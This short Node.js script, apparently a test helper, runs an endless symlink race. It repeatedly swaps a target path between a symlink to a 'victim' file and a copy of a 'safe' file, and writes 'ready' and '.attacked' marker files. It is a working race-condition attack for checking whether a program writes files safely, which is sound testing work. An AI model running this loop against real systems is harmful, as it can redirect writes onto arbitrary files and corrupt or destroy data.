const fs = require("node:fs")
const [final, safe, victim, marker] = process.argv.slice(2)
fs.writeFileSync(marker, "ready")
for (;;) {
  try { fs.unlinkSync(final) } catch {}
  try { fs.symlinkSync(victim, final); fs.writeFileSync(`${marker}.attacked`, "final") } catch {}
  try { fs.unlinkSync(final) } catch {}
  try { fs.copyFileSync(safe, final) } catch {}
}
